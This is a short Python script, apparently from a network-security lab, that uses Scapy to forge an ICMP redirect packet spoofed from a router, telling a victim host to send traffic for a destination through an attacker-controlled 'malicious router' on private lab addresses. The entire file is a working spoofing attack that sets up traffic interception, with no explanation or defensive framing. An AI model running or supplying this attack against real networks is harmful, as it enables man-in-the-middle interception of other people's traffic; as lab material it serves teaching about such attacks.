#!/usr/bin/python3

from scapy.all import *

victim     = '10.9.0.5'
mal_router = '10.9.0.111'
router     = '10.9.0.11'
dest       = '192.168.60.5'

ip   = IP(src = router, dst = victim)
icmp = ICMP(type=5, gw=mal_router)
ip2  = IP(src = victim, dst = dest)

send(ip/icmp/ip2/ICMP())
